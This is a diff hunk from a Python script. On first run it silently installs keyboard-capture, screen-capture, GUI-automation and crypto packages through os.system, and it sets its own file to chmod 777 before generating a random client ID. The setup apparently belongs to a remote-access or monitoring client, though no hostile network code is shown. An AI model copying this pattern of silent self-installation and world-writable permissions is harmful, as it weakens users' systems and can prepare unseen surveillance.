@@ -36,44 +36,37 @@ if 'linux' in str(platform.platform()).lower():
 
 if first_execution:
     if 'linux' in system_os:
-        pip = [
-            'pip3 install requests'
-            'pip3 install Pillow',
-            'pip3 install pyautogui',
-            'pip3 install wmi',
-            'pip3 install pytest-shutil',
-            'pip3 install cv2',
-            'pip3 install pynput',
-            'pip3 install PyQt5',
-            'pip3 install PyAutoGUI',
-            'pip3 install cryptography',
-            'pip3 install opencv-python',
-            'pip3 install mss',
-            'pip3 install pygame',
-        ]
-
-        for e in pip:
-            os.system(e)
+        os.system(f'chmod 777 {os.path.basename(__file__)}')
+        os.system('pip3 install requests')
+        os.system('pip3 install Pillow')
+        os.system('pip3 install pyautogui')
+        os.system('pip3 install wmi')
+        os.system('pip3 install pytest-shutil')
+        os.system('pip3 install cv2')
+        os.system('pip3 install pynput')
+        os.system('pip3 install PyQt5')
+        os.system('pip3 install PyAutoGUI')
+        os.system('pip3 install cryptography')
+        os.system('pip3 install opencv-python')
+        os.system('pip3 install mss')
+        os.system('pip3 install pygame')
+        os.system('pip3 install numpy')
 
     elif 'windows' in system_os:
-        pip = [
-            'pip install Pillow',
-            'pip install requests',
-            'pip install pyautogui',
-            'pip install wmi',
-            'pip install pytest-shutil',
-            'pip install cv2',
-            'pip install pynput',
-            'pip install PyQt5',
-            'pip install PyAutoGUI',
-            'pip install cryptography',
-            'pip install opencv-python',
-            'pip install mss',
-            'pip install pygame',
-        ]
-
-        for e in pip:
-            os.system(e)
+        os.system('pip install Pillow')
+        os.system('pip install requests')
+        os.system('pip install pyautogui')
+        os.system('pip install wmi')
+        os.system('pip install pytest-shutil')
+        os.system('pip install cv2')
+        os.system('pip install pynput')
+        os.system('pip install PyQt5')
+        os.system('pip install PyAutoGUI')
+        os.system('pip install cryptography')
+        os.system('pip install opencv-python')
+        os.system('pip install mss')
+        os.system('pip install pygame')
+        os.system('pip install numpy')
 
     client_tag_nb = (random.randint(int('1' + '0' * 30), int('9' + '0' * 30)))
 
